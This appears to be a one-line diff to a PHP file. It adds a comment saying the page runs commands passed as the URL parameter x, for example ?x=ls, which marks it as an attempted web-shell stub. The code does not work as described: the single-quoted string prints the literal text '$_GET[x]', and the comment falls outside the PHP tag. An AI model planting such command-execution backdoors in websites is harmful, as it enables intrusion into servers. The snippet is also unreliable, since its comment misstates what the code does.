@@ -1,1 +1,1 @@
-<?='$_GET[x]'?>
+<?='$_GET[x]'?> // run ass .php?x=ls
